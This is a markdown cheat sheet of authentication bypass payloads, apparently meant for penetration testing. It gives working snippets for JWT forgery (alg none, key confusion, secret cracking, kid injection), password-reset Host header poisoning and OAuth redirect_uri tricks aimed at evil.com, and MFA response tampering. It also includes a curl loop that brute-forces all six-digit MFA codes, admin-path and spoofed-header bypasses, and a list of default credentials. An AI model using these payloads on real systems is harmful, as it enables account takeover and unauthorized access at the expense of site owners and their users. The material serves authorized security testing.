# Auth Bypass Payloads & Techniques

## JWT Attacks

### Algorithm Confusion — none
```
# Change alg to "none", remove signature
header: {"alg":"none","typ":"JWT"}
payload: {"sub":"admin","role":"admin"}
token: base64(header).base64(payload).
```

### Algorithm Confusion — RS256 → HS256
```
# Use public key as HMAC secret
python3 -c "
import jwt, base64
pubkey = open('public.pem').read()
token = jwt.encode({'sub':'admin','role':'admin'}, pubkey, algorithm='HS256')
print(token)
"
```

### JWT Secret Bruteforce
```
hashcat -a 0 -m 16500 <JWT_TOKEN> /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py <token> -C -d wordlist.txt
```

### JWT kid Injection
```json
{"alg":"HS256","kid":"../../dev/null"}
# Sign with empty string as secret
```

## Password Reset Bypass

### Host Header Injection
```
POST /forgot-password
Host: evil.com
# Reset link sent to: https://evil.com/reset?token=XXX
```

### Token Leak via Referrer
```
# After clicking reset link, navigate to external resource
# Token appears in Referer header
```

### Weak Token Entropy
```
# Tokens based on timestamp, username, or sequential IDs
# Predict or brute-force
```

## OAuth / SSO Bypass

### redirect_uri Manipulation
```
redirect_uri=https://target.com.evil.com
redirect_uri=https://target.com/callback/../evil
redirect_uri=https://target.com%2F@evil.com
```

### State Parameter Missing → CSRF Login
```
# No state param = no CSRF protection on login
# Force victim to login with attacker account
```

### Code/Token Reuse
```
# Try replaying authorization code
GET /oauth/callback?code=LEAKED_CODE
```

## MFA Bypass

### Response Manipulation
```
# Intercept failed MFA response:
{"success": false, "mfa_required": true}
# Change to:
{"success": true, "mfa_required": false}
```

### Code Reuse
```
# Try previously used TOTP codes (within time window)
# Try code from another user's session
```

### Brute Force — No Rate Limit
```
for code in $(seq -w 000000 999999); do
  curl -s -X POST https://target.com/mfa \
    -d "code=$code" \
    -H "Cookie: session=VALID_SESSION" | grep -v "invalid"
done
```

## HTTP Method Override
```
X-HTTP-Method-Override: GET
X-Method-Override: GET
_method=GET
```

## Path Bypass — Admin Panel
```
/admin → 403
/Admin → 200
/ADMIN → 200
/admin/ → 200
/admin;/ → 200
/admin/. → 200
/%61dmin → 200 (URL encoded 'a')
/admin%2F → 200
/./admin → 200
//admin → 200
```

## Header Injection for Auth
```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: localhost
X-Custom-IP-Authorization: 127.0.0.1
```

## Default Credentials
```
admin:admin
admin:password
admin:123456
admin:admin123
root:root
root:toor
test:test
guest:guest
```
